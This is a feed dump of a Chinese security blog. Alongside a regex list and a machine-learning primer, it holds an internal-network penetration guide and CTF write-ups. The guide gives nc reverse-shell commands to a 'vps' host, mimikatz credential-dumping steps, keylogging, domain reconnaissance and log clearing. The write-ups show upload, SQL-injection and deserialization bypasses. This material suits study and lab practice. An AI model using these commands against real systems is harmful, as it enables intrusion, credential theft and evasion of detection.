href="#15-提取Color-Hex-Codes" class="headerlink" title="15. 提取Color Hex  Codes"></a><strong>15. 提取Color Hex  Codes</strong></h2><p>有时需要抽取网页中的颜色代码，可以使用下面的表达式。</p><pre><code>^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$</code></pre><h2 id="16-提取网页图片"><a href="#16-提取网页图片" class="headerlink" title="16. 提取网页图片"></a><strong>16. 提取网页图片</strong></h2><p>假若你想提取网页中所有图片信息，可以利用下面的表达式。</p><pre><code>\\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&#39;]{0,1}([^\\&quot;\\&#39;\\ &gt;]*)</code></pre><h2 id="17-提取页面超链接"><a href="#17-提取页面超链接" class="headerlink" title="17. 提取页面超链接"></a><strong>17. 提取页面超链接</strong></h2><p>提取html中的超链接。</p><pre><code>(&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&#39;.implode(&#39;|(?:www\\.)?&#39;, $follow_list).&#39;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt;</code></pre><h2 id="18-查找CSS属性"><a href="#18-查找CSS属性" class="headerlink" title="18. 查找CSS属性"></a><strong>18. 查找CSS属性</strong></h2><p>通过下面的表达式，可以搜索到相匹配的CSS属性。</p><pre><code>^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1}</code></pre><h2 id="19-抽取注释"><a href="#19-抽取注释" class="headerlink" title="19. 抽取注释"></a><strong>19. 抽取注释</strong></h2><p>如果你需要移除HMTL中的注释，可以使用如下的表达式。</p><pre><code>&lt;!--(.*?)--&gt;</code></pre><h2 id="20-匹配HTML标签"><a href="#20-匹配HTML标签" class="headerlink" title="20. 匹配HTML标签"></a><strong>20. 匹配HTML标签</strong></h2><p>通过下面的表达式可以匹配出HTML中的标签属性。</p><pre><code class="regex">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#39;.*?&#39;|[\\^&#39;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;20个常用的正则表达式&quot;&gt;&lt;a href=&quot;#20个常用的正则表达式&quot; class=&quot;headerlink&quot; title=&quot;20个常用的正则表达式&quot;&gt;&lt;/a&gt;20个常用的正则表达式&lt;/h1&gt;&lt;h2 id=&quot;1-校验密码强度&quot;&gt;&lt;a href=&quot;#1-校验密码强度&quot;
      
    
    </summary>
    
      <category term="Language" scheme="http://mang0.me/categories/Language/"/>
    
    
      <category term="正则" scheme="http://mang0.me/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>机器学习概念</title>
    <link href="http://mang0.me/archives/d4eed376/"/>
    <id>http://mang0.me/archives/d4eed376/</id>
    <published>2018-10-09T08:29:01.000Z</published>
    <updated>2018-10-15T00:40:51.608Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习概念"><a href="#机器学习概念" class="headerlink" title="机器学习概念"></a>机器学习概念</h1><h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>我们通常在计算机编程的时候，都是已知输入，然后通过一定的算法产生输出，如下图所示：</p><p><a href="http://blog.laiyum.site/uploads/18052801.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052801.jpg" alt="image"></a></p><p>而还有一种情况呢，我们知道了输入和输出，但是却不知道中间的算法，这时候就需要用机器学习通过观察输入输出来学习这个算法，我们叫做知识，然后用学到的知识通过新的输入来产生输出。简而言之<strong>机器学习是用来寻找输入输出间的映射关系的</strong><br><a href="http://blog.laiyum.site/uploads/18052802.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052802.jpg" alt="image"></a></p><p>其实我们人在学习思考时，脑子里也有这么个映射过程，当我们看到猫的图片，在脑子里产生了映射，于是乎，就说出了猫这个词，所以呢<strong>机器学习就是让计算机和人一样思考</strong></p><p><a href="http://blog.laiyum.site/uploads/18052803.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052803.png" alt="image"></a></p><h2 id="机器学习相关概念的区别"><a href="#机器学习相关概念的区别" class="headerlink" title="机器学习相关概念的区别"></a>机器学习相关概念的区别</h2><p>在谈到机器学习时，我们经常会听到下面几个概念：数据挖掘，人工智能等等，那他们之间有什么联系呢？我们先来看看下面的这幅图：</p><p><a href="http://blog.laiyum.site/uploads/18052808.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052808.png" alt="image"></a></p><p>也就是说机器学习是数据挖掘它们的底层，机器学习给它们提供算法，数据挖掘则是机器学习的应用。</p><h2 id="机器学习的应用"><a href="#机器学习的应用" class="headerlink" title="机器学习的应用"></a>机器学习的应用</h2><p>像我们熟知的Apple的faceID，google的AlphaGo，MicroSoft的小娜都是机器学习的典型应用</p><h2 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h2><p>实现机器学习有多种方法，这里方法是我们通常所说的算法，主要有下面几种：</p><h3 id="监督学习方法"><a href="#监督学习方法" class="headerlink" title="监督学习方法"></a>监督学习方法</h3><p>所谓监督学习方法就是说随便给一堆数据和数据对应的标签，计算机在学习之后能根据新的输入数据判断它们对应的标签。</p><p>举个例子，我们给计算机一大堆猫狗的图片，并告诉它，哪些是狗，哪些是猫，计算机学习之后，再给它看猫和狗的图片，它就能告诉我们哪些是狗，哪些是猫。</p><p><a href="http://blog.laiyum.site/uploads/18052804.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052804.png" alt="image"></a></p><p><a href="http://blog.laiyum.site/uploads/18052805.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052805.png" alt="image"></a></p><p>监督学习方法用于分类和回归，我们熟知的神经网络就是一种监督学习方法。</p><h3 id="非监督学习方法"><a href="#非监督学习方法" class="headerlink" title="非监督学习方法"></a>非监督学习方法</h3><p>我们有的时候只给计算机数据，不给计算机对应的标签，计算机能通过观察数据之间的规率进行数据归类<br>还是上面的例子，我们这次不告诉计算机哪些是狗，哪些是猫，计算机学习之后能把他们归类出来。</p><p><a href="http://blog.laiyum.site/uploads/18052806.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052806.png" alt="image"></a></p><p>非监督学习用于聚类，如k-means算法</p><h3 id="半监督学习方法"><a href="#半监督学习方法" class="headerlink" title="半监督学习方法"></a>半监督学习方法</h3><p>半监督学习方法综合了监督学习和非监督学习两种方法。在初始阶段给计算机一些有标签的数据和大量没有标签的数据，计算机学习后能进行归类<br>半监督学习用于训练更高效更准确的模型，因为它既避免了带标签的数据少而的模型过拟合，也减少了打标签的工作量。</p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><p>强化学习是学习一个最优策略，可以让本体在特定环境中，根据当前的状态，做出行动，从而获得最大奖励。</p><p>来个新例子，这次，我们让计算机打篮球，我们并不需要告诉计算机怎么打篮球，我们只需要给它个篮球，让它自己打，然后我们对计算机打分，进球分越高，打分越高，这里的打分就是上面的奖励，每次计算机要做的就是获得最大奖励，一开始，面对陌生的环境，计算机并不知道怎么进球，经过奖励刺激后，命中率就会越来越高。</p><p><a href="http://blog.laiyum.site/uploads/18052807.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052807.png" alt="image"></a></p><p>google的AlphaZero便是强化学习的典型应用</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>模拟自然界优胜劣汰的进化现象，把搜索空间（问题解的组成空间）映射为遗传空间，把可能的解编码成一个向量——染色体，向量的每个元素称为基因。通过不断计算各染色体的适应值，选择最好的染色体，获得最优解。</p><p>还是拿上面的例子来说，先训练出两个打篮球的计算机ai，让这两个aic重组，变异产生后代种群，挑出最会打篮球的再进行重组变异，如此循环，每次挑出最强的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;机器学习概念&quot;&gt;&lt;a href=&quot;#机器学习概念&quot; class=&quot;headerlink&quot; title=&quot;机器学习概念&quot;&gt;&lt;/a&gt;机器学习概念&lt;/h1&gt;&lt;h2 id=&quot;什么是机器学习&quot;&gt;&lt;a href=&quot;#什么是机器学习&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="AiSecurity" scheme="http://mang0.me/categories/AiSecurity/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈内网渗透流程</title>
    <link href="http://mang0.me/archives/17ef10d7/"/>
    <id>http://mang0.me/archives/17ef10d7/</id>
    <published>2018-10-09T02:50:44.000Z</published>
    <updated>2018-10-15T00:40:51.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈内网渗透流程"><a href="#浅谈内网渗透流程" class="headerlink" title="浅谈内网渗透流程"></a>浅谈内网渗透流程</h1><h2 id="0x01-内网转发"><a href="#0x01-内网转发" class="headerlink" title="0x01 内网转发"></a>0x01 内网转发</h2><h3 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h3><p>Lcx内网端口转发<br>• lcx.exe -slave vps 3333 127.0.0.1 3389 //把主机的3389端口转发到vps的3333端口<br>• lcx.exe –listen 3333 4444 //监听3333端口，并将3333的请求转发给4444端口</p><p>本地端口转发<br>• Lcx.exe –tran 21 主机IP 3389 //将3389端口转发到21端口</p><p>通常时候内网的防火墙把3389端口ban了，无法作为端口转发出去，这个时候应该吧端口转发成21或者80端口，这些端口是有放行策略的，</p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><ul><li>Earthworm </li><li>Termite  //ew升级版 <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li></ul><p>客户端执行：</p><pre><code>agent_windows_x86.exe -l  4444</code></pre><p>管理端执行：</p><pre><code>admin_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>将新的agent加入拓扑：</p><pre><code>agent_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>具体使用方法可参考： <a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="external">http://rootkiter.com/Termite/README.txt</a></p><ul><li><p>S5.py  //配合Proxifier一起使用</p></li><li><p>reGeorg //通过webshell 建立一个 socks 代理进行内网穿透</p><p>  s</p></li></ul><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>反向连接<br>• nc -lvp 4444 //vps上执行<br>• nc -t -e cmd.exe vps 4444 //-t 参数是指通过telnet模式执行cmd.exe<br> 正向代理<br>• nc -l -p 4444 -t -e cmd.exe //vps上<br>• nc -vv vps 4444 //本地执行</p><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p><p><strong>frp 的作用</strong></p><p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p><p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p><p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p><p>启动frp服务器端：</p><pre><code>frps.exe -c frps.ini</code></pre><p>浏览器访问： 127.0.0.1：7500，输入frps.ini中配置的用户名和密码即可进入控制面板： </p><h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>这里仅简单演示下Windows平台上的使用：</p><p>首先在内网主机上执行（内网主机需安装Python）：</p><pre><code>python -m SimpleHTTPServer 8089</code></pre><p>我这里在Windows下用Python 2.7来演示，就执行：</p><pre><code>py -2 -m SimpleHTTPServer 8089</code></pre><p><a href="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" alt="内网渗透之端口转发与代理"></a></p><p>将ngrok上传至内网主机并启动ngrok：</p><pre><code>ngrok.exe http 8089</code></pre><p><a href="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" alt="内网渗透之端口转发与代理"></a></p><p>这时我们只需要在浏览器中访问：</p><pre><code>http://cdb0e21b.ngrok.io或者https://cdb0e21b.ngrok.io</code></pre><p>即可通过HTTP或者HTTPS来访问内网主机上的文件。</p><p>当然ngrok还有很多其他功能，更多使用方法请参考官方文档： <a href="https://ngrok.com/docs" target="_blank" rel="external">https://ngrok.com/docs</a></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>query user || qwinsta 查看当前在线用户</p><p>net user  查看本机用户</p><p>net user /domain 查看域用户</p><p>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多</p><p>net view /domain 查看有几个域</p><p>net view \\dc   查看 dc 域内共享文件</p><p>net group /domain 查看域里面的组</p><p>net group “domain admins” /domain 查看域管</p><p>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</p><p>net group “domain controllers” /domain 域控</p><p>net time /domain </p><p>net config workstation   当前登录域 - 计算机名 - 用户名</p><p>net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</p><p>ipconfig</p><p>systeminfo</p><p>tasklist /svc</p><p>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</p><p>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</p><p>netstat -ano</p><p>nltest /dclist:xx  查看域控</p><p>whoami /all 查看 Mandatory Label uac 级别和 sid 号</p><p>net sessoin 查看远程连接 session (需要管理权限)</p><p>net share     共享目录</p><p>cmdkey /l   查看保存登陆凭证</p><p>echo %logonserver%  查看登陆域</p><p>spn –l administrator spn 记录</p><p>set  环境变量</p><p>dsquery server - 查找目录中的 AD DC/LDS 实例</p><p>dsquery user - 查找目录中的用户</p><p>dsquery computer 查询所有计算机名称 windows 2003</p><p>dir /s *.exe 查找指定目录下及子目录下没隐藏文件</p><p>arp -a</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Windows密码 //收集管理员信息</p><p>mimikatz.exe </p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806221754_957.png" alt=""></p><p>破解lm密码使用：<a href="http://www/object_security.ch/en/opcrack.php" target="_blank" rel="external">http://www/object_security.ch/en/opcrack.php</a></p><p> token::elevate</p><p> lsadump::sam</p><p> lsadump::secrets </p><p>exit </p><p> wifi 密码： </p><p>• Mysql等数据库密码 </p><p>• 浏览器保存密码</p><p> • 浏览器历史记录</p><p> • 远程桌面历史记录</p><p> • 查找文件</p><p> • 键盘记录</p><p>keyscan_start</p><p>keyscan_dump</p><p> • 中间人</p><h2 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h2><p> • 端口扫描</p><p> • 命令执行</p><p> • SQL注入</p><p> • 文件上传 </p><p>• 密码爆破</p><p> • 各类CVE </p><h2 id="0x04-收尾工程"><a href="#0x04-收尾工程" class="headerlink" title="0x04 收尾工程"></a>0x04 收尾工程</h2><p>痕迹清理 </p><p>系统日志 //%systemroot%system32configSecEvent.EVT<br>• 应用程序日志 //%systemroot%system32configAppEvent.EVT<br>• FTP日志 //%systemroot%system32logfilesmsftpsvc1<br>• WWW日志 //%systemroot%system32logfilesw3svc1</p><p>参考文章</p><p><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/170970.html</a></p><p><a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="external">https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="external">https://www.anquanke.com/post/id/92646</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈内网渗透流程&quot;&gt;&lt;a href=&quot;#浅谈内网渗透流程&quot; class=&quot;headerlink&quot; title=&quot;浅谈内网渗透流程&quot;&gt;&lt;/a&gt;浅谈内网渗透流程&lt;/h1&gt;&lt;h2 id=&quot;0x01-内网转发&quot;&gt;&lt;a href=&quot;#0x01-内网转发&quot; class=&quot;he
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://mang0.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="http://mang0.me/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>安恒5月</title>
    <link href="http://mang0.me/archives/18042369/"/>
    <id>http://mang0.me/archives/18042369/</id>
    <published>2018-08-25T12:40:51.000Z</published>
    <updated>2018-10-15T00:40:51.601Z</updated>
    
    <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>题目</p><pre><code>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。</code></pre><p>题目给了代码</p><pre><code>&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;; if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {     echo &#39;A_A,have fun&#39;; } elseif ($str&lt;9999999999) {     echo &#39;A_A,too small&#39;; } elseif ((string)$str&gt;0) {     echo &#39;A_A,too big&#39;; } else{     echo file_get_contents(&#39;flag.php&#39;); } ?&gt;</code></pre><p>首先第一个if判断，可以用<code>urlencode</code>绕过</p><p>然后我们需要知道php中的这样一个特性</p><pre><code>php &gt; var_dump([]&gt;9999999999);bool(true)php &gt; var_dump((string)[]&gt;0);bool(false)</code></pre><p>在php中，数组<code>[]</code>大于任何一个数</p><p>这样就可以成功绕过验证了</p><p><code>php -r &quot;var_dump([]&gt;233333333);&quot;</code></p><p>true</p><p><a href="http://101.71.29.5:10007/?A+A[]=admin" target="_blank" rel="external">http://101.71.29.5:10007/?A+A[]=admin</a></p><p>这里有个坑，flag被注释了，需要查看源代码才能看得到flag</p><pre><code>flag={09bc24026c987ae44a6e424479b2e3}</code></pre><h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。</p><p>经过别人的提示，是反序列化以后，多抓几个包看一下  在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code> </p><p>解码发现是个<code>json格式</code>的东西 </p><p>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><pre><code class="php">&lt;?php $a[] = &#39;../../controllers/Basecontrol.php&#39;; $b[] = &#39;../../flag.php&#39;; $c[] = &#39;../../controllers/User.php&#39;; $d[] = &#39;../../controllers/Controllers.php.php&#39;;echo urlencode(base64_encode(serialize($a)));12345678</code></pre><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><pre><code class="php">&lt;?php$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;1234</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p><p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.</p><p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p><p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p><p>想到还有一种检测文件的方法，那就是文件头标志.</p><p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg</p><p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg. 我们将文件名改成mu.jpg.php,上传成功，网站打开发现，mu.peg.php 解析成功. 这考虑的是apache的特性 从后往前识别</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201808211643_505.png" alt=""></p><p>连接菜刀，拿到flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://mang0.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒7月</title>
    <link href="http://mang0.me/archives/b20debe2/"/>
    <id>http://mang0.me/archives/b20debe2/</id>
    <published>2018-08-25T12:39:36.000Z</published>
    <updated>2018-10-15T00:40:51.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒杯7月"><a href="#安恒杯7月" class="headerlink" title="安恒杯7月"></a>安恒杯7月</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x00-order"><a href="#0x00-order" class="headerlink" title="0x00 order"></a>0x00 order</h3><p>提示</p><p>1.右键提示 从flag表中得到flag</p><p>2.order注入</p><p>只对某一参数注入</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261044_138.png" alt=""></p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs –dump-all –thread 10</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261613_856.png" alt=""></p><p>flag{666_0rdorby_you_can}</p><h3 id="0x01-就这么直接"><a href="#0x01-就这么直接" class="headerlink" title="0x01 就这么直接"></a>0x01 就这么直接</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221514_920.png" alt=""></p><p>提交查询页面跳转到 我觉得这并不是答案</p><p>右键源码得到 hint.php</p><p>访问得到代码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807211925_710.png" alt=""></p><p>分析：</p><p>1.访问页面的时间戳作为播种时间 </p><p>2.输出md5</p><p>php -r “echo md5(time());”</p><p>随机抽取一个md5的值输入进去</p><p>php -r “echo md(time());”</p><p>返回 答案错误</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807211928_659.png" alt=""></p><pre><code class="python">import requestsimport reimport ioimport sysurl=&quot;http:&quot;s=requests.Session()p=s.get(url)s.encoding = &#39;utf-8&#39;payload={&#39;answer&#39;:&#39;c4ca4238a0b923820dcc509a6f75849b&#39;}q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)payload={&#39;answer&#39;:html_doc[160:192]}#返回的md5值q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)print(html_doc)</code></pre><p>flag{ef58f0b1e9437b4451248fb3f239622b}</p><h3 id="0x02简历来了"><a href="#0x02简历来了" class="headerlink" title="0x02简历来了"></a>0x02简历来了</h3><p>当时没做出来 再次复现的</p><p>题目的知识点：</p><p>1、csrf的原理</p><p>2、swf的文件头flash的检查</p><p>cws fws zws</p><h4 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h4><p>上传简历</p><p>php代码审计：</p><p>直接提交访问</p><pre><code class="php">&lt;?phprequire_once(&#39;init.php&#39;);header(&quot;Content-type: text/html; charset=utf-8&quot;);if(isset($_POST[&#39;submit&#39;])){    if(!z_validate_captcha()){        die(&#39;验证码错误&#39;);    }    $email = isset($_POST[&#39;email&#39;])?trim($_POST[&#39;email&#39;]):&#39;&#39;;    $url = isset($_POST[&#39;url&#39;])?trim($_POST[&#39;url&#39;]):&#39;&#39;;    $file = isset($_FILES[&#39;file&#39;])?$_FILES[&#39;file&#39;]:false;    if($email == false || $url == false || $file == false){        die(&#39;Invalid Input&#39;);    }    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){        die(&#39;Invalid Email&#39;);    }    if(!filter_var($url, FILTER_VALIDATE_URL) || (strpos($url, &#39;http://&#39;) !== 0 &amp;&amp; strpos($url, &#39;https://&#39;) !== 0)){        die(&#39;Invalid URL&#39;);    }    if($file[&#39;error&#39;] || $file[&#39;size&#39;] &gt; 1024*1024 || !is_uploaded_file($file[&#39;tmp_name&#39;])){        die(&#39;Invalid File&#39;);    }    $ext = getExt($file[&#39;name&#39;]);    if(!in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;, &#39;.docx&#39;, &#39;.doc&#39;))){        die(&#39;Invalid File Type&#39;);    }    $file_checked = false;    if(in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;image/gif&#39;, &#39;image/jpeg&#39;, &#39;image/jpg&#39;, &#39;image/png&#39;, &#39;application/octet-stream&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }elseif(in_array($ext, array(&#39;.docx&#39;, &#39;.doc&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;application/msword&#39;,&#39;application/word&#39;, &#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }    if($file_checked !== true){        die(&#39;Invalid File Type&#39;);    }    $filename = &#39;./upload/&#39;.md5(mt_rand().microtime()).$ext;    move_uploaded_file($file[&quot;tmp_name&quot;], $filename);    if(!file_exists($filename)){        echo &#39;上传失败&#39;;    }else{        save_resume($email, $url, $filename);        echo &quot;&lt;br/&gt;提交成功：&quot;;        echo &quot;&lt;br/&gt;邮箱：&quot;.htmlspecialchars($email);        echo &quot;&lt;br/&gt;个人网站：&quot;.htmlspecialchars($url);        echo &quot;&lt;br/&gt;简历地址：&quot;.htmlspecialchars($filename);        echo &quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;;    }}show_source(__FILE__);</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201807271711_417.png" alt=""></p><p><a href="http://101.71.29.5:10001/admin/index.php" target="_blank" rel="external">http://101.71.29.5:10001/admin/index.php</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807271711_670.png" alt=""></p><p>考虑知识点csrf 我们要模拟管理员去访问</p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="external">Flash跨域数据劫持漏洞，一大波网站受影响</a><br><strong>object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。</strong></p><p>flash文件有三种文件头：CWS FWS ZWS【最新的】<br>由于ZWS是新兴的文件格式，PHP暂不支持。</p><p>在php中，当解析cws,fws格式的文件的时候，会解析成 application/x-shockwave-flash;<br>但是当解析 zws 格式的文件时候，会解析成 application/octet-stream<br>从而绕过MIME限制。</p><p><strong>目录扫描发现<a 